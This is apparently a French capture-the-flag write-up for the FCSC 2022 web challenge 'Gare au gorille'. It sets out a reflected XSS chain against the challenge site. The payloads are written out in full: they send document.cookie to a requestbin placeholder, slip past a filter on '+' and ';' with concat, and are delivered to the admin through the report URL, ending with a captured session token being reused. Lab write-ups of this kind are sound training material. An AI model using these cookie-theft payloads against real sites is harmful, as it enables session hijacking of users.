<h1>Gare au gorille</h1>

<p>On test dans un premier temps le champs search :</p>

> https://gare-au-gorille.france-cybersecurity-challenge.fr/?search=<script>alert(1)</script> <br/>



![Alt text](https://github.com/Haktary/FCSC-2022/blob/main/Gare%20au%20gorille/Capture%20d’écran%202022-05-10%20160319.png?raw=true "alert")

<br/>
<br/>
Cela fonctionne je crée donc une request bin https://requestbin.net et test simplement : <br/>

> <script>document.location= urlrequestbin?= + document.cookie </script>
<br/>
Cela ne marche pas après plusieurs test on se rend compte que les '+' et les ';' ne fonctionne pas. Pour contourner le problème je fais donc une recherche type javascript concat fonction et je tombe bien sur une fonction concat et modifie mon payload en conséquense : <br/> 


> <script>document.location="".concat('urlrequestbin?=', document.cookie)</script> 
</br>
On recupère notre propre token, on envoie donc la payload à l'admin par l'url de report : <br/> 

> https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/?search=<script>document.location="".concat(%27http://urlrequestbin?=%27,%20document.cookie)</script> <br/>

![Alt text](https://github.com/Haktary/FCSC-2022/blob/main/Gare%20au%20gorille/Capture%20d’écran%202022-05-10%20162522.png?raw=true "token") <br/>

On set maintenant le token dans notre cookie dans le header : <br/>

> Cookie: token=O9Mv3sFaQD1UpQRLCXVOCzCi0dRbpz4Wy4kGPngZt36MZnR6xZpbHLQRWfDi6T45 <br/>

![Alt text](https://github.com/Haktary/FCSC-2022/blob/main/Gare%20au%20gorille/Capture%20d’écran%202022-05-10%20163109.png?raw=true "flag")







